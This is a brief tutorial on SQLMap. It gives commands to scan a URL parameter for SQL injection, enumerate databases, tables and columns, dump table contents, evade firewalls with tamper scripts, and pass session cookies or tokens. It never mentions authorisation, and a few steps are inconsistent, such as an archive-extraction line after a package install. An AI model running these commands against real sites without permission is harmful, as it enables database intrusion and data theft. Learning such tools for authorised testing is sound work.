

# 1. Installation of SQLMap
Before using SQLMap, you need to have it installed on your system. SQLMap works on Linux, macOS, and Windows.

* Linux:

  * sudo apt-get update
  * sudo apt-get install sqlmap

* Then, extract the archive and run SQLMap from the command line.

# 2. Identify the Target URL

To test for SQL injection, you'll need a URL with parameters that are potentially vulnerable. Look for URLs that include parameters like:


* http://example.com/page?id=1

In this case, id=1 is a parameter that could be vulnerable.

# 3. Basic SQLMap Usage
* The most basic SQLMap command is:

  * sqlmap -u "http://example.com/page?id=1"

This will scan the target URL for potential SQL injection vulnerabilities.

# 4. Retrieve Database Information
If SQLMap finds a vulnerability, you can start extracting information from the database.

* Find Database Name:

  * sqlmap -u "http://example.com/page?id=1" --dbs

* Find Tables: After identifying the database name, list the tables:

  * sqlmap -u "http://example.com/page?id=1" -D database_name --tables
 
 * Find Columns: Once you've identified a table, list the columns:

  * sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name --columns

# 5. Dump Data
* To retrieve the actual data stored in the tables:

  * sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name --dump

# 6. Bypass WAF (Web Application Firewall)
* If the website has a Web Application Firewall (WAF), you can try evading it with tamper scripts or payload encoding:

  * sqlmap -u "http://example.com/page?id=1" --tamper=base64encode

# 7. Authentication and Cookies
* If the website requires login or authentication, you can pass session cookies to SQLMap:


  * sqlmap -u "http://example.com/page?id=1" --cookie="PHPSESSID=abcdefgh123456"
* You can also include authentication headers:

  * sqlmap -u "http://example.com/page?id=1" --headers="Authorization: Bearer your_token_here"

# 8. Automated Tests
* For a fully automated scan, SQLMap offers an --batch option to automate all decisions:

  * sqlmap -u "http://example.com/page?id=1" --batch

# 9. Advanced Options
* Fingerprint the Database: Identify the database system and version:

  * sqlmap -u "http://example.com/page?id=1" --fingerprint
* Search for Specific Data: Search for specific text or patterns in the database:

  * sqlmap -u "http://example.com/page?id=1" -D database_name --search -T table_name --search -C column_name --string "search_text"

# 10. Logging and Output
* You can save the output to a file for future reference:

  * sqlmap -u "http://example.com/page?id=1" -o --output-dir=./sqlmap-output/
